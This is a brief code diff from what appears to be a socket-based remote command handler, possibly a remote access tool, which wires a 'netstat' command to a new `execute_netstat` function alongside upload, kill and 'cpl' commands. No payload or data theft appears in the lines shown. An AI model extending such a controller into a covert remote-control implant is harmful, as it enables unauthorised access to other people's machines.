@@ -31,7 +31,7 @@ def run(host, port):
                 if uploaded_data.startswith("[!] Error"):
                     continue
             elif command == "netstat":
-                pass
+                execute_netstat(client_socket)
             elif command[:4] == "kill":
                 pass
             elif command == "cpl":
